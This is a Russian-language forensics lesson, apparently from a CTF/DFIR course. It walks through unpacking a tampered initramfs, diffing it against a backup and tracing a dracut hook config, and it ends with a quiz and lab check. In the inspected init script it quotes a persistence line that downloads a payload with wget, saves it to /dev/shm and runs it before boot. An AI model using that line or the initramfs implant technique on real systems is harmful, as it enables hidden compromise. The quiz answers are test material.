---
id: linux-initramfs
title: 'initramfs: код, который запускается раньше корня'
category: forensics
parent: forensics-linux-kernel
difficulty: hard
order: 3
tags: [linux, initramfs, boot, initrd, persistence, forensics]
prerequisites: [forensics-linux-artifacts-advanced]
useful_for:
  - 'CTF Forensics категория'
  - 'DFIR / Incident Response'
  - 'Анализ образов и артефактов'
estimated_minutes: 45
summary: 'Что такое initramfs, как его распаковать и найти внедрённый код, который запускается до монтирования настоящей файловой системы.'
lab:
  kind: shell
  title: 'Практика: initramfs'
  toolset: [core, grep, strings]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' answer.txt'
  hints:
    - 'Прочитай файл-артефакт: `cat <файл>`.'
    - 'Ищи строку с меткой nto{.'
    - 'Сохрани: `grep nto <файл> > answer.txt`.'
---

## Вопрос, с которого всё начинается

Ты проверил все файлы в `/etc`, `systemd`-юниты, `crontab` — чисто. А система всё равно
заражена. Причина может быть в **initramfs** — образе, который ядро распаковывает в
память до того, как смонтирует настоящий корень. Малварь там невидима обычным
инструментам.

## Наш пример: образ /boot

Начнём с того, что лежит в `/boot`.

## Шаг 1: находим образ

```
$ ls -la /boot/
-rw-r--r-- 1 root root 64M Jan 14 03:30 initramfs-6.1.0.img
-rw-r--r-- 1 root root 12M Jan 10 03:30 initramfs-6.1.0.img.bak
```

Два образа: основной и бэкап. Основной изменён 14 января в 03:30 — в то же окно, что и
другие подозрительные события. Значит, его пересобирали.

## Шаг 2: распаковываем

initramfs — это gzip-сжатый **cpio**-архив:

```
$ file initramfs-6.1.0.img
initramfs-6.1.0.img: gzip compressed data, ...
$ zcat initramfs-6.1.0.img | cpio -idm --quiet -D /tmp/initrd
$ ls /tmp/initrd | head
bin  etc  init  lib  lib64  sbin  usr
```

Получили виртуальную мини-систему. Первый исполняемый файл — `init`.

## Шаг 3: смотрим init

`init` — это первая программа, которую запускает ядро. В штатной системе она монтирует
корень и передаёт управление. Но её можно изменить:

```
$ cat /tmp/initrd/init | head
#!/bin/sh
mount -t proc none /proc
...
wget -q http://203.0.113.5/x -O /dev/shm/x && chmod +x /dev/shm/x && /dev/shm/x &
exec switch_root /sysroot /sbin/init
```

Строка `wget ... | /dev/shm/x` — внедрённый код. Он скачивает и запускает нагрузку до
того, как смонтирован настоящий корень, — потому и не виден в обычных логах.

## Шаг 4: что ещё изменено

Сравниваем с бэкапом:

```
$ zcat initramfs-6.1.0.img.bak | cpio -idm --quiet -D /tmp/initrd_bak
$ diff -rq /tmp/initrd /tmp/initrd_bak
Files /tmp/initrd/init and /tmp/initrd_bak/init differ
Only in /tmp/initrd/usr/bin: x
```

Разница показывает ровно два изменения: подменённый `init` и добавленный бинарник `x`.

## Шаг 5: как это попало

Пересборка initramfs делается утилитами `dracut`/`mkinitramfs`/`update-initramfs`.
Смотрим историю:

```
$ grep -i initramfs /var/log/dpkg.log
2026-01-14 03:29:55 install dracut:amd64 ...
$ ls -la /etc/dracut.conf.d/
-rw-r--r-- 1 root root 40 Jan 14 03:28 99-hook.conf
```

Конфиг-файл `99-hook.conf` добавлен за минуту до пересборки — вот механизм.

## Что мы теперь знаем

- initramfs запускается до монтирования настоящего корня.
- Это gzip+cpio архив; распаковывается `zcat | cpio -idm`.
- Первый файл — `init`; его подмена даёт код до загрузки системы.
- Сравнение с бэкапом быстро показывает изменения.
- Пересборка оставляет следы в `dpkg.log` и `/etc/dracut.conf.d`.

## Если не сработало

- Нет бэкапа? Сравни с initramfs из пакета (`apt download linux-image-...`).
- Образ не gzip? Проверь `file` — бывает xz/zstd (`xzcat`/`zstdcat`).
- SELinux? Дополнительно смотри audit-лог.

## Квиз

Проверь себя.

```quiz
- question: Когда запускается код из initramfs?
  options:
    - 'после входа в систему'
    - 'до монтирования настоящей корневой ФС'
    - 'после выключения'
    - 'в браузере'
  answer: 1
  explanation: 'initramfs — ранняя стадия загрузки, до switch_root.'
- question: Что представляет собой файл initramfs?
  options:
    - 'текстовый список'
    - 'gzip-сжатый cpio-архив'
    - 'базу данных'
    - 'образ диска'
  answer: 1
  explanation: 'Обычно это gzip/xz/zstd + cpio-архив мини-системы.'
- question: Какая программа выполняется первой внутри initramfs?
  options:
    - 'bash'
    - 'init'
    - 'systemd'
    - 'cron'
  answer: 1
  explanation: 'Ядро запускает /init из распакованного initramfs.'
- question: Как быстрее всего найти изменения в initramfs?
  options:
    - 'переустановить систему'
    - 'сравнить с бэкапом (diff -rq)'
    - 'перезагрузиться'
    - 'отключить сеть'
  answer: 1
  explanation: 'Сравнение с чистым/бэкапным образом сразу показывает отличия.'
```
